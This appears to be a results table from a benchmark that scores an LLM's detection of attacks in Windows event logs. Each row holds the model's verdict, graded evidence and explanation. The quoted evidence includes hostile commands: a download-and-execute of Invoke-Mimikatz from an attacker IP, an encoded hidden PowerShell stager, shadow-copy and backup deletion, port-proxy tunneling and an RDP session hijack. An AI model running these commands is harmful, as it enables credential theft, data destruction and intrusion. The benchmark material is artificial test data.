# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
claude-opus-4-8,ID4103-4104 - SPN discovery (moder nPowerShell).evtx,hard,C,processed,YES,100.0,95.0,YES,"4104, 4103, 4100",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,OFFSEC\admmig,"$SPNName = 'MSSQLSvc/Svc-SQL-DB01.offsec.lan', Add-Type -AssemblyNAme System.IdentityModel, New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName, Set-StrictMode -Version 1.0","MSSQLSvc/Svc-SQL-DB01.offsec.lan, fs02.offsec.lan",,0.0,5.52,5.7,5.0,4.0,2,16.7,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4104, 4103, 4100
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- Accounts: OFFSEC\admmig
- Commands: $SPNName = 'MSSQLSvc/Svc-SQL-DB01.offsec.lan', Add-Type -AssemblyNAme System.IdentityModel, New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName, Set-StrictMode -Version 1.0
- Network: MSSQLSvc/Svc-SQL-DB01.offsec.lan, fs02.offsec.lan
- Registry: None

EXPLANATION:
The sequence sets an MSSQLSvc SPN variable, loads System.IdentityModel, then requests a KerberosRequestorSecurityToken for that SPN — a classic Kerberoasting technique used to extract service ticket hashes for offline cracking. This manual PowerShell activity targeting a SQL service account SPN is consistent with credential-access/privilege-escalation behavior rather than routine administration."
claude-opus-4-8,ID6004-DNS-server-failed zone transfer.evtx,easy,A,processed,YES,100.0,100.0,YES,6004,,,,"10.23.23.9, non-existing.lan., google.com., hacking-zone.lan., rootdc1.offsec.lan",,0.0,4.00,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 6004
- Processes: None
- Accounts: None
- Commands: None
- Network: 10.23.23.9, non-existing.lan., google.com., hacking-zone.lan., rootdc1.offsec.lan
- Registry: None

EXPLANATION:
A single source IP (10.23.23.9) is generating repeated DNS queries in quick succession, including for non-existing and suspicious domains like ""non-existing.lan."" and ""hacking-zone.lan."", which is consistent with DNS reconnaissance or enumeration activity. Event ID 6004 indicates the DNS server received dynamic update or query requests that fail, and the pattern of probing both internal and external (google.com.) names suggests scanning rather than normal client resolution."
claude-opus-4-8,ID5145-DNS hosts files access via network share.evtx,easy,A,processed,YES,100.0,83.3,YES,5145,,admmig,,10.23.23.9,,0.0,5.94,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5145
- Processes: None
- Accounts: admmig
- Commands: None
- Network: 10.23.23.9
- Registry: None

EXPLANATION:
A single user (admmig from 10.23.23.9) is repeatedly accessing the administrative C$ share on fs03vuln, traversing into sensitive system paths including WINDOWS\SYSTEM32\DRIVERS\ETC and the hosts file, and even reading the hosts:Zone.Identifier alternate data stream. This pattern of remote admin-share access to modify the hosts file is consistent with lateral movement and DNS/redirection tampering rather than routine file activity. The combined access requests with write masks (0x100081) over critical system directories strengthens the assessment of malicious intent."
claude-opus-4-8,ID4624-Anonymous login with domain specified (DonPapi).evtx,easy,A,processed,YES,100.0,100.0,YES,4624,,"ANONYMOUS LOGON, admmig",,10.23.123.11,,0.0,4.34,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4624
- Processes: None
- Accounts: ANONYMOUS LOGON, admmig
- Commands: None
- Network: 10.23.123.11
- Registry: None

EXPLANATION:
A single source IP (10.23.123.11) generated an ANONYMOUS LOGON via NTLM V1 immediately followed by a rapid burst of NTLM Type 3 network logons for the privileged account ""admmig"" within milliseconds of each other, indicating automated/scripted authentication rather than normal user activity. This pattern of an anonymous logon followed by high-frequency privileged-account logons from one host is consistent with credential relay or lateral-movement tooling against fs03vuln."
claude-opus-4-8,ID4661-Local group enumeration with RID brutforce with CME.evtx,easy,A,processed,YES,100.0,100.0,YES,"4661, 4662",C:\Windows\System32\lsass.exe,"admmig, ROOTDC1$",,rootdc1.offsec.lan,,0.0,6.97,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4661, 4662
- Processes: C:\Windows\System32\lsass.exe
- Accounts: admmig, ROOTDC1$
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
A single account (admmig) systematically enumerated the SAM_SERVER, SAM_DOMAIN, and a comprehensive sweep of every SAM_ALIAS/built-in domain group (S-1-5-32-544 through 582 and domain RIDs like 517/553/571/572) within seconds via lsass.exe, which is the hallmark of automated AD group/domain reconnaissance (e.g., DCSync/BloodHound-style enumeration). The accompanying 4662 events accessing the DS object {832b1c45-...} with the replication-related property set indicate directory replication/secrets access typical of a DCSync attack. This rapid, exhaustive privileged-object access pattern against a domain controller is not consistent with normal interactive administration."
claude-opus-4-8,"ID4624,4688,5140,5145-Eternal Romance - MS17_010_psexec (GLOBAL).csv",,,processed,YES,100.0,83.0,YES,"1102, 4964, 4672, 4624, 5140, 5145, 4688, 4673","cmd.exe, powershell.exe, conhost.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\lsass.exe","admmig, FS03VULN$, LOCAL SERVICE","C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'} | $s=New-Object System.Diagnostics.ProcessStartInfo | $s.FileName=$b | $s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('...')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))' | $s.UseShellExecute=$false | $s.RedirectStandardOutput=$true | $s.WindowStyle='Hidden' | $s.CreateNoWindow=$true | $p=[System.Diagnostics.Process]::Start($s) | ""","10.23.123.11, 10.23.23.9",,16.7,11.49,5.0,6.0,3.3,4,18.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4964, 4672, 4624, 5140, 5145, 4688, 4673
- Processes: cmd.exe, powershell.exe, conhost.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\lsass.exe
- Accounts: admmig, FS03VULN$, LOCAL SERVICE
- Commands: C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('...')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);""
- Network: 10.23.123.11, 10.23.23.9
- Registry: None

EXPLANATION:
The Security log was cleared (1102) followed by a remote NTLM logon from 10.23.123.11 to the IPC$ and ADMIN$ shares accessing svcctl (service control / psexec-style remote execution), spawning cmd.exe that launches a hidden, base64-encoded GZip-compressed PowerShell payload — a classic obfuscated stager. The presence of a ""MS17_010_psexec.evtx"" file accessed on admmig's desktop and the LSASS LsaRegisterLogonProcess privilege use confirm EternalBlue/PsExec-style lateral movement and post-exploitation activity. The combination of log clearing, encoded fileless PowerShell, and admin-share remote service execution is strongly indicative of an attack."
claude-opus-4-8,"ID5140-5145,4688,4697-Encrypted payload deployed with service over SMB (GLOBAL).csv",,,processed,YES,100.0,73.9,YES,"5140, 5145, 4697, 4688","powershell.exe, cmd.exe, conhost.exe, services.exe, cscript.exe, MOFWriter.exe, ASMHost.exe, SecEdit.exe, MusNotification.exe, MonitoringHost.exe","admmig, SRVDEFENDER01$","C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'} | $s=New-Object System.Diagnostics.ProcessStartInfo | ...[System.Convert]::FromBase64String(''H4sIAPU7gGAC...''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))', ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""",10.23.123.11,,0.0,11.04,4.4,6.0,4.0,4,18.4,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5140, 5145, 4697, 4688
- Processes: powershell.exe, cmd.exe, conhost.exe, services.exe, cscript.exe, MOFWriter.exe, ASMHost.exe, SecEdit.exe, MusNotification.exe, MonitoringHost.exe
- Accounts: admmig, SRVDEFENDER01$
- Commands: C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;...[System.Convert]::FromBase64String(''H4sIAPU7gGAC...''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))', ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""
- Network: 10.23.123.11
- Registry: None

EXPLANATION:
This is a clear remote service-based execution attack (PsExec/SMBExec-style): the admmig account connects over SMB to IPC$ and ADMIN$ shares from 10.23.123.11, accesses the svcctl named pipe (Service Control Manager), and creates a service (iOWamcEn / EventID 4697) running as LocalSystem whose binary is a Base64-gzip-compressed, obfuscated PowerShell payload executed with -nop -w hidden -noni (Empire/Cobalt-Strike launcher pattern). The service spawns cmd.exe → powershell.exe → SysWOW64 powershell.exe under services.exe, which is a textbook lateral-movement and code-execution chain. The repeated cscript MonitorKnowledgeDiscovery.vbs and MOFWriter/ASMHost/SecEdit activity is legitimate Microsoft Monitoring Agent baseline activity and is benign, but the encoded PowerShell service install is the malicious signal."
claude-opus-4-8,"ID4688,4778,4779 RDP hijack direct.evtx",easy,A,processed,YES,100.0,74.0,YES,"4688, 4779, 4778","cmd.exe, tscon.exe, TSTheme.exe, AtBroker.exe, rdpclip.exe, taskhostw.exe, dllhost.exe, svchost.exe, winlogon.exe","FS01$, admmig, admmarsid","cmd  /k tscon 2 /dest:rdp-tcp#8, tscon  2 /dest:rdp-tcp#8",10.23.23.9,,0.0,7.08,4.4,5.0,4.0,3,16.4,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4779, 4778
- Processes: cmd.exe, tscon.exe, TSTheme.exe, AtBroker.exe, rdpclip.exe, taskhostw.exe, dllhost.exe, svchost.exe, winlogon.exe
- Accounts: FS01$, admmig, admmarsid
- Commands: cmd  /k tscon 2 /dest:rdp-tcp#8, tscon  2 /dest:rdp-tcp#8
- Network: 10.23.23.9
- Registry: None

EXPLANATION:
A SYSTEM-context cmd.exe (SubjectUserName FS01$, S-1-5-18) launched tscon.exe with ""/dest:rdp-tcp#8"" to hijack session 2, which is the classic RDP session hijacking technique allowing connection to another user's session without credentials. The resulting disconnect (4779 admmig) and reconnect (4778 admmarsid) on the same RDP-Tcp#8 session from JUMP01/10.23.23.9 confirms an actor stealing/swapping another user's interactive session via tscon abuse. This privileged session takeover by SYSTEM is a strong indicator of lateral movement / privilege abuse."
claude-opus-4-8,ID4688-4778 RDP hijack command execution.evtx,easy,A,processed,YES,100.0,81.5,YES,"4688, 4778","sc.exe, cmd.exe, tscon.exe, conhost.exe, TSTheme.exe, rdpclip.exe, AtBroker.exe, rdpinput.exe, consent.exe, taskhostw.exe, dllhost.exe, mmc.exe, backgroundTaskHost.exe","admmig, FS01$, admmarsid","sc.exe  start hijackservice, cmd.exe /k tscon 2 /dest:rdp-tcp#5, tscon  2 /dest:rdp-tcp#5, ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s",10.23.23.9,,0.0,7.68,4.9,6.0,4.0,4,18.9,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4778
- Processes: sc.exe, cmd.exe, tscon.exe, conhost.exe, TSTheme.exe, rdpclip.exe, AtBroker.exe, rdpinput.exe, consent.exe, taskhostw.exe, dllhost.exe, mmc.exe, backgroundTaskHost.exe
- Accounts: admmig, FS01$, admmarsid
- Commands: sc.exe  start hijackservice, cmd.exe /k tscon 2 /dest:rdp-tcp#5, tscon  2 /dest:rdp-tcp#5, ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s
- Network: 10.23.23.9
- Registry: None

EXPLANATION:
A SYSTEM-level (FS01$, S-1-5-18) process spawned by services.exe runs ""tscon 2 /dest:rdp-tcp#5"" to hijack another user's RDP session (admmarsid) without credentials, a classic RDP session-hijacking privilege escalation technique confirmed by the 4778 session reconnect from client JUMP01 (10.23.23.9). Additionally, ""sc.exe start hijackservice"" indicates a malicious/abused service, and the launch of eventvwr.msc with high-integrity mmc.exe is consistent with the known eventvwr UAC bypass. The combination of service abuse, SYSTEM-driven session hijacking, and UAC bypass strongly indicates malicious attacker activity."
claude-opus-4-8,"ID4688,4697,5140-5145 PSexec remote execution + admin share.evtx",easy,A,processed,YES,100.0,69.4,YES,"4624, 5140, 5145, 4674, 4697, 4688","PSEXESVC.exe, C:\Windows\PSEXESVC.exe, C:\Windows\System32\services.exe, C:\Windows\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe, C:\Windows\System32\HOSTNAME.EXE, C:\Windows\System32\cscript.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe","admmig, SRVDEFENDER01$","C:\Windows\PSEXESVC.exe, ""cmd.exe"" -u demo\admmig -p Admin1235 -accepteula , whoami, hostname, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""",10.23.42.22,,0.0,7.43,4.2,6.0,4.0,4,18.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4624, 5140, 5145, 4674, 4697, 4688
- Processes: PSEXESVC.exe, C:\Windows\PSEXESVC.exe, C:\Windows\System32\services.exe, C:\Windows\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe, C:\Windows\System32\HOSTNAME.EXE, C:\Windows\System32\cscript.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe
- Accounts: admmig, SRVDEFENDER01$
- Commands: C:\Windows\PSEXESVC.exe, ""cmd.exe"" -u demo\admmig -p Admin1235 -accepteula , whoami, hostname, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""
- Network: 10.23.42.22
- Registry: None

EXPLANATION:
The sequence shows a classic PsExec lateral movement attack: remote Kerberos logons (Type 3) from 10.23.42.22, writing PSEXESVC.exe to the ADMIN$ share, service creation (4697) running as LocalSystem, and execution of PSEXESVC.exe spawning cmd.exe with cleartext credentials passed on the command line (""-u demo\admmig -p Admin1235""). Subsequent reconnaissance commands (whoami, hostname) confirm hands-on-keyboard discovery activity following the remote code execution."
claude-opus-4-8,ID4688-4648 Lateral movement with net use.evtx,easy,A,processed,YES,100.0,90.0,YES,"4688, 4648",C:\Windows\System32\net.exe,"admmig, hack1",net  use m: \\fs03vuln\c$ /USER:offsec\hack1,"\\fs03vuln\c$, fs03vuln.offsec.lan, cifs/fs03vuln.offsec.lan",,0.0,4.74,5.4,5.0,4.0,3,17.4,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4648
- Processes: C:\Windows\System32\net.exe
- Accounts: admmig, hack1
- Commands: net  use m: \\fs03vuln\c$ /USER:offsec\hack1
- Network: \\fs03vuln\c$, fs03vuln.offsec.lan, cifs/fs03vuln.offsec.lan
- Registry: None

EXPLANATION:
The account admmig mapped an administrative C$ share on fs03vuln using explicit alternate credentials for the account hack1 (Event 4648 explicit credential logon paired with the net use admin-share command in Event 4688). The use of explicit credentials to access an administrative C$ share with a different account is a common lateral movement pattern indicating credential misuse rather than routine activity."
claude-opus-4-8,ID13-RDP shadow session configuration enabled (registry).evtx,easy,A,processed,YES,100.0,88.9,YES,12,C:\Windows\system32\reg.exe,,,,HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services,0.0,3.14,5.3,6.0,4.0,4,19.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 12
- Processes: C:\Windows\system32\reg.exe
- Accounts: None
- Commands: None
- Network: None
- Registry: HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services

EXPLANATION:
The event shows reg.exe creating/modifying a registry key under Terminal Services policy, tagged with technique T1076 (Remote Desktop Protocol). This activity is consistent with an attacker enabling or manipulating RDP settings to establish remote access persistence, which is a known lateral movement and persistence technique."
claude-opus-4-8,ID5600-proxy configuration changed.evtx,easy,A,processed,YES,100.0,71.4,YES,5600,,,,"http://hacker-proxy.lan:123, http://hacker-bypass.com/, http://internal.lan;<local>",,0.0,4.05,4.3,6.0,4.0,3,17.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5600
- Processes: None
- Accounts: None
- Commands: None
- Network: http://hacker-proxy.lan:123, http://hacker-bypass.com/, http://internal.lan;<local>
- Registry: None

EXPLANATION:
Repeated proxy configuration changes redirect WinINet traffic through ""http://hacker-proxy.lan:123"" and set a malicious auto-config (PAC) URL ""http://hacker-bypass.com/"", consistent with attacker-controlled traffic interception/redirection. The escalating sequence of paired changes (setting proxy, then auto-config URL, then bypass lists) on the same host indicates deliberate man-in-the-middle/exfiltration setup rather than routine configuration."
claude-opus-4-8,ID4688-netsh RDP port forwarding abuse.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4964, 4672, 4624, 4627","C:\Windows\System32\netsh.exe, C:\Windows\System32\cmd.exe","admmig, FS01$","netsh  I p a v l=8001 listena=0.0.0.0 connectp=3389 c=1.1.1.1, netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=80, netsh  interface portproxy reset","0.0.0.0, 3389, 1.1.1.1, 127.0.0.1, 10.23.23.9",,0.0,6.65,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4964, 4672, 4624, 4627
- Processes: C:\Windows\System32\netsh.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig, FS01$
- Commands: netsh  I p a v l=8001 listena=0.0.0.0 connectp=3389 c=1.1.1.1, netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=80, netsh  interface portproxy reset
- Network: 0.0.0.0, 3389, 1.1.1.1, 127.0.0.1, 10.23.23.9
- Registry: None

EXPLANATION:
The security log was cleared (Event 1102) immediately before a series of netsh portproxy commands were run, indicating anti-forensic activity followed by network pivoting setup. The portproxy rules forward external traffic to RDP (3389) and local services, a classic lateral movement/tunneling technique, executed by the privileged account admmig with extensive sensitive privileges (SeDebugPrivilege, SeImpersonatePrivilege). The combination of log clearing, privilege escalation, and port forwarding strongly indicates malicious post-compromise behavior."
claude-opus-4-8,ID4688-Delete VSS backup (WMI).evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\wbem\WMIC.exe, C:\Windows\System32\VSSVC.exe, C:\Windows\System32\svchost.exe","admmig, FS03$","wmic  shadowcopy delete /nointeractive, C:\Windows\system32\vssvc.exe, C:\Windows\System32\svchost.exe -k swprv",,,0.0,4.76,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\wbem\WMIC.exe, C:\Windows\System32\VSSVC.exe, C:\Windows\System32\svchost.exe
- Accounts: admmig, FS03$
- Commands: wmic  shadowcopy delete /nointeractive, C:\Windows\system32\vssvc.exe, C:\Windows\System32\svchost.exe -k swprv
- Network: None
- Registry: None

EXPLANATION:
The account admmig executed ""wmic shadowcopy delete /nointeractive"", which deletes Volume Shadow Copies to prevent file recovery — a hallmark of ransomware and anti-recovery (defense evasion) behavior. The subsequent VSSVC.exe and svchost.exe -k swprv processes are the Volume Shadow Service components invoked to carry out the deletion, confirming the destructive action succeeded."
claude-opus-4-8,ID4688-Delete Window backup (webadmin).evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688","C:\Windows\System32\wbadmin.exe, C:\Windows\System32\wbem\WMIADAP.exe, C:\Windows\System32\wbem\WmiPrvSE.exe","admmig, FS03$","wbadmin  delete backup -backupTarget:m:\ -deleteOldest, wmiadap.exe /R /T, C:\Windows\system32\wbem\wmiprvse.exe -Embedding",,,0.0,6.64,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688
- Processes: C:\Windows\System32\wbadmin.exe, C:\Windows\System32\wbem\WMIADAP.exe, C:\Windows\System32\wbem\WmiPrvSE.exe
- Accounts: admmig, FS03$
- Commands: wbadmin  delete backup -backupTarget:m:\ -deleteOldest, wmiadap.exe /R /T, C:\Windows\system32\wbem\wmiprvse.exe -Embedding
- Network: None
- Registry: None

EXPLANATION:
The security log was cleared (Event 1102) by account admmig, immediately followed by that same account running wbadmin.exe to delete backups, both classic anti-recovery and anti-forensic techniques. The pairing of log clearing with backup deletion within seconds strongly indicates ransomware/destructive attack preparation rather than routine administration."
claude-opus-4-8,ID800-4103-4104-Delete VSS backup (PowerShell).evtx,easy,A,processed,YES,100.0,91.7,YES,"800, 4104, 4103",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,OFFSEC\admmig,Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete() | },,,0.0,5.85,5.5,5.0,4.0,2,16.5,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4104, 4103
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- Accounts: OFFSEC\admmig
- Commands: Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
- Network: None
- Registry: None

EXPLANATION:
The user OFFSEC\admmig executed a PowerShell command to enumerate and delete all Volume Shadow Copies via WMI (Win32_Shadowcopy $_.Delete()). Deleting shadow copies is a well-known anti-recovery technique used by ransomware to prevent victims from restoring files, and serves no legitimate routine administrative purpose in this context."
claude-opus-4-8,ID4728-Massive account group membership change.evtx,easy,A,processed,YES,100.0,100.0,YES,4728,,"lambda-user, hack-adm-hack, Group01, Group02, Group03, Group04, Group05, Group06, Group07, Group08, Group09, Group10, Group11",,,,0.0,5.12,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4728
- Processes: None
- Accounts: lambda-user, hack-adm-hack, Group01, Group02, Group03, Group04, Group05, Group06, Group07, Group08, Group09, Group10, Group11
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
A single account (lambda-user) added the same member (hack-adm-hack) to 11 different security groups (Group01-Group11) within milliseconds, indicating automated/scripted mass group enrollment rather than normal administrative activity. The suspicious naming of the added member (""hack-adm-hack"") combined with rapid sequential additions across many groups is consistent with privilege escalation and persistence behavior."
claude-opus-4-8,"4624,4674,4688- CrackMap Exec SMB mimikatz.evtx",easy,B,processed,YES,100.0,72.8,YES,"4624, 4674, 4688","cmd.exe, powershell.exe, conhost.exe, services.exe, WmiPrvSE.exe","ANONYMOUS LOGON, admmig, FS03VULN$","cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C, IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:2626/Invoke-Mimikatz.ps1'), Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit', C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd""",10.23.123.11,"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters, \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PERFLIB",0.0,8.61,4.4,6.0,4.0,4,18.4,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4624, 4674, 4688
- Processes: cmd.exe, powershell.exe, conhost.exe, services.exe, WmiPrvSE.exe
- Accounts: ANONYMOUS LOGON, admmig, FS03VULN$
- Commands: cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C, IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:2626/Invoke-Mimikatz.ps1'), Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit', C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd""
- Network: 10.23.123.11
- Registry: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters, \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PERFLIB

EXPLANATION:
The logs show an obfuscated PowerShell command (character-array encoded) launched via cmd.exe that disables SSL certificate validation and downloads/executes Invoke-Mimikatz from 10.23.123.11:2626 to dump credentials (sekurlsa::logonpasswords), a clear credential-theft attack. This was preceded by ANONYMOUS LOGON and NTLM authentication from the same source IP, and followed by execution of a suspicious C:\tools\shell.cmd, consistent with lateral movement and post-exploitation. The combination of obfuscation, Mimikatz download, and remote payload retrieval confirms malicious activity."
